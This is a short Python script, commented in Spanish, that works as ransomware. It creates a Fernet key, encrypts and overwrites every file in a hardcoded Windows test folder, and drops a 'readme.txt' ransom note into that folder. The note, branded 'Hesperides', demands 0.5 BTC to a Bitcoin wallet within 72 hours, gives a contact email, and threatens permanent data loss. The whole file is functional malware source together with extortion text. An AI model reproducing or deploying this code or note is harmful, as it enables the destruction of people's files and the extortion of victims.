import imp
from importlib.resources import path
#Librerias de criptografia para el cifrado
from cryptography.fernet import Fernet
import os

#Funcion para generar la clave que cifrara los archivos 


def generar_llave():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


#En esta funcion vamos a cargar la llave

def cargar_llave():
    return open("key.key", "rb").read()
    
#Aqui encriptamos los archivos
def encriptar(items, key):
    #Aqui vamos a poner el metodo que ira encriptando los ficheros
    x = Fernet(key)
    #Aqui vamos a crear un bucle para que vaya recorriendo los elementos y mientras los 
    #vaya cifrando
    for item in items:
        with open(item, "rb") as file:
            file_data = file.read()
        encrypted_data = x.encrypt(file_data)
        with open(item, "wb") as file:
            file.write(encrypted_data)
            


if __name__ == "__main__":
    #Aqui es donde va el path de los ficheros a encriptar
    #||||||||[!!!!]MUCHO CUIDADO||||||||
    path_to_encrypt = "C:\\Users\\rafa\\Desktop\\prueba"
    #Esta es la lista de archivos dentro del path donde hemos descargado el ransom
    items = os.listdir(path_to_encrypt)
    #Esto es una lista por compresion,es un bucle for que va a efectuar el cifrado en cada 
    #archivo del path
    full_path = [path_to_encrypt + "/" + item for item in items]



#Activamos las funciones

generar_llave()
key = cargar_llave()
#Con este metodo encriptamos con la llave cada uno de los archivos en el path
encriptar(full_path, key)

#Aqui vamos a poner el fichero donde pediremos el rescate
ransom_note = """
    ------------------------------------------
              ¡ATENCIÓN!
    ------------------------------------------

    Ha sido infectado por el ransomware Hesperides. Todos sus archivos importantes han sido cifrados y no pueden ser accedidos. Esto incluye, pero no se limita a, documentos, fotos, vídeos y bases de datos.

    Para recuperar sus archivos, siga las siguientes instrucciones:

    1. **No intente desencriptar sus archivos sin nuestra ayuda.**
       Cualquier intento de hacerlo puede resultar en la pérdida permanente de sus datos.

    2. **Debe pagar un rescate en Bitcoin.**
       El monto del rescate es de 0.5 BTC. 

    3. **Realice el pago a la siguiente cartera de Bitcoin:**
       `1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa`

    4. **Una vez realizado el pago:**
       Envíe un correo electrónico a `hesperides_support@protonmail.com` con el siguiente asunto: `Pago de Rescate Hesperides`
       En el cuerpo del mensaje incluya:
       - La dirección desde la que envió el pago.
       - Su identificador de víctima: `VIC-ID-XXXXXX` (reemplazar con su identificador único que debería haberse proporcionado en otro archivo)

    5. **Recibirá instrucciones de desencriptación:**
       Una vez confirmado el pago, le enviaremos una herramienta de desencriptación junto con la clave única para recuperar sus archivos.

    ¡IMPORTANTE!

    - El plazo para realizar el pago es de 72 horas. Si no se realiza el pago en este período, su clave de desencriptación será eliminada y sus archivos serán irrecuperables.
    - Si no sabe cómo comprar Bitcoins, utilice los siguientes recursos:
       - [LocalBitcoins.com](https://localbitcoins.com)
       - [Coinbase.com](https://www.coinbase.com)
       - [Binance.com](https://www.binance.com)

    Recuerde, solo nosotros podemos ayudarle a recuperar sus archivos. Cualquier intento de recuperación por terceros puede resultar en la pérdida permanente de sus datos.

    Lamentamos los inconvenientes y le agradecemos su cooperación.

    ------------------------------------------
              Hesperides Ransomware
    ------------------------------------------
                            ___
                          _/`.-'`.
                _      _/` .  _.'
       ..:::::.(_)   /` _.'_./
     .oooooooooo\ \o/.-'__.'o.
    .ooooooooo`._\_|_.'`oooooob.
  .ooooooooooooooooooooo&&oooooob.
 .oooooooooooooooooooo&@@@@@@oooob.
.ooooooooooooooooooooooo&&@@@@@ooob.
doooooooooooooooooooooooooo&@@@@ooob
doooooooooooooooooooooooooo&@@@oooob
dooooooooooooooooooooooooo&@@@ooooob
dooooooooooooooooooooooooo&@@oooooob
`dooooooooooooooooooooooooo&@ooooob'
 `doooooooooooooooooooooooooooooob'
  `doooooooooooooooooooooooooooob'
   `doooooooooooooooooooooooooob'
    `doooooooooooooooooooooooob'
     `doooooooooooooooooooooob'
     `dooooooooobodoooooooob'
       `doooooooob dooooooob'
         `"""""""' `""""""'
    """
    
    # Guardar la nota de rescate en un archivo
with open(os.path.join(path_to_encrypt, "readme.txt"), "w") as file:
    file.write(ransom_note)
